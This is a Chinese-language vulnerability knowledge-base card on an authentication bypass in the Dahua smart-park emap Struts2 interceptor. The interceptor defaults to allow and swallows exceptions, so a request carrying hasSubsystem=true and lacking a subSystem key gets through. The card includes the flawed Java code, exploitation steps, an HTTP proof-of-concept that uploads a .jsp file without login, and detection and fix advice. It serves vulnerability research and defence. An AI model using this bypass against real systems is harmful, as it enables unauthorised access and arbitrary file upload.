---
id: web-java-component-dahua-emap-myinterceptor-catch-auth-bypass
title: 大华智慧园区 emap MyInterceptor 鉴权绕过：permission 默认 true 且 catch 吞异常，hasSubsystem=true 触发 NPE 即放行
type: scenario
domain: web
path: web/java/component
technique: dahua-emap-myinterceptor-exception-auth-bypass
tags:
- java
- dahua
- wpms
- auth-bypass
- struts2
- interceptor
- exception-handling
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V383-fix
  verified_at: '2026-11-09T09:01:06+08:00'
  notes: V383 核对指出两处并已修正：1) execute 分支实为 "execute".contains(cxt.getName())，即 action 名须为 execute 的子串，原卡写成『action 名包含 execute』方向相反；已修正原理、触发条件与变体表述。2) 触发条件原称 subSystem 白名单非空才使 NPE 成立，实际 subBean.get("subSystem") 为 null 时 .toString() 在 contains 前即抛 NPE，与白名单内容无关；已改。主流程（permission 默认 true、catch 吞异常、hasSubsystem=true、ignoreActionMethod）核对不变。
url: /docs/web/java/component/web-java-component-dahua-emap-myinterceptor-catch-auth-bypass/
draft: false
kb_aliases:
- MyInterceptor 鉴权绕过
- hasSubsystem=true
- permission 默认 true
- emap 未授权
- subSystem NPE 绕过
---

## 一句话结论

大华智慧园区 emap 模块的 Struts2 拦截器 `com.dahuatech.util.aop.MyInterceptor` 在 `before()` 里把 `permission` 初始化为 `true`，整个校验逻辑包在 `try/catch` 中，而 `catch` 只 `printStackTrace()` 后直接 `return permission`——攻击者只要构造一个能让代码在 `permission = false` 之前抛异常的请求（如 `hasSubsystem=true` 且请求体里没有 `subSystem` 键，`subBean.get("subSystem").toString()` 触发 NPE），鉴权就会以“默认放行”收场，从而未授权访问所有挂在该拦截器上的 emap action（例如任意文件上传接口）。

## 原理

- **拦截器分发**：`struts-default.xml` 为 emap 注册了 `myInterceptor`（`com.dahuatech.util.aop.MyInterceptor`）。`intercept()` 的逻辑是：action 名在 `ignoreActionMethod` 白名单里 → 直接 `invocation.invoke()`；否则 `before(invocation)` 返回 true → 调用，返回 false → 返回 `"login"`。
- **`before()` 的缺陷结构**：
  ```java
  boolean permission = true;
  try {
      ...
      if ("execute".contains(cxt.getName())) { ... permission = true; }
      else {
          Object token = session.get(Constants.TOKEN);
          if (token == null) {
              if (hasSubsystem != null && hasSubsystem.equals("true")) {
                  ptoken = getRequestBodyString(request.getReader());
                  Map<String,String> subBean = getMapFromStringParam(ptoken);
                  if (this.subSystem.contains(((String)subBean.get("subSystem")).toString())) {
                      permission = true;
                  } else { permission = false; }
              } else { permission = hasLogin(...); }
          } else { ... }
      }
  } catch (Exception e) { e.printStackTrace(); }
  return permission;
  ```
- **为什么能绕过**：`permission` 默认 `true`；`subBean.get("subSystem")` 在请求体不含该键时返回 null，`.toString()` 抛 `NullPointerException`，直接跳到 `catch`；`catch` 没有把 `permission` 置 false、也没有终止请求，于是返回初始值 `true`。即“异常发生在拒绝赋值之前 ⇒ 保持放行”。
- **触发入口**：`hasSubsystem=true` 是普通的请求参数（query 即可），请求体可以是任意不含 `subSystem` 的内容；`getRequestBodyString(request.getReader())` 读到的内容解析后缺少 `subSystem` 键，即可稳定触发。原文用该姿势未授权调用 `devicePoint_addImgIco` 并成功上传 `.jsp`。
- **另一个无鉴权面**：`ignoreActionMethod` 硬编码了 6 个 action（`emap_noticeBitmapSyncData`、`login_userLogout`、`staircase_getListByMapId`、`emap_findConfigData`、`bitmap_findAllMap`、`picture_getPicPath`），命名命中即完全跳过 `before()`。
- **`execute` 分支**：判断式为 `"execute".contains(cxt.getName())`，即 action 名是 `execute` 的子串（如 `execute` 本身）时直接 `permission = true`（主系统菜单获取），也可作为另一条放行路径。

## 触发条件

- 目标为大华智慧园区综合管理平台，emap 模块可访问，Struts2 配置使用 `myInterceptor`。
- 请求体解析后缺少 `subSystem` 键：`subBean.get("subSystem")` 返回 null，`.toString()` 在进入 `contains` 前即抛 NPE（与 `subSystem` 白名单内容无关）；或 action 名命中 `ignoreActionMethod` / 是 `execute` 的子串。
- 攻击者能向目标发送普通 HTTP 请求，无需登录态。

## 利用步骤

1. 确认 emap 接口可达，例如 `POST /emap/devicePoint_addImgIco?hasSubsystem=true`。
2. 请求体任意（multipart/表单均可），确保解析后没有 `subSystem` 键，使 `subBean.get("subSystem").toString()` 抛 NPE。
3. 拦截器 `catch` 吞掉异常并保持 `permission=true`，请求进入目标 action。
4. 以未授权状态调用后续敏感 action（如文件上传、配置读取）；原文以 `devicePoint_addImgIco` 上传 `.jsp` 验证。
5. 记录请求/响应作为未授权证据；不要落地持久化文件。

## PoC

```http
POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="upload"; filename="1.jsp"
Content-Type: image/jpeg

test123
------x--
```

未携带任何登录 Cookie/session；响应 `{"code":1,"data":"ico_res_<随机>_on.jsp"}` 即证明请求已越过鉴权进入上传 action。请求体里不出现 `subSystem` 键是触发 NPE 的关键。

## 变体与关联

- 变体：直接命中 `ignoreActionMethod` 中 6 个 action 名之一，无需构造异常。
- 变体：action 名是 `execute` 的子串（`"execute".contains(name)`）时走 `permission = true` 分支；若该分支内 `isReqLegal` 也能被异常跳过，则同样放行。
- 变体（通用模式）：鉴权拦截器把结果变量初始化为“通过”，`catch` 只记录异常不重置，任何能在拒绝前触发异常的畸形参数都能绕过。
- 关联：[[web-java-component-dahua-emap-devicepoint-addingico-upload]]（本卡放行后的文件上传 sink）、[[web-java-component-dahua-publishing-userauthenticationfilter-path-whitelist-bypass]]（同平台另一模块的 Filter 白名单绕过）。

## 检测与防御

- 防御：`permission` 默认值改为 `false`（fail-closed）；`catch` 中必须重置为 false 并终止请求；不要把“异常”当作可通过。
- 防御：`subSystem` 判空后再调用；请求体解析失败直接拒绝；`ignoreActionMethod` 改为显式精确路径白名单并定期审计。
- 检测：emap 请求中出现 `hasSubsystem=true` 且请求体不含 `subSystem`；日志出现 `NullPointerException` 后紧跟对敏感 action 的 200 响应；未登录会话调用 `devicePoint_*`、`poi_*` 等 action。
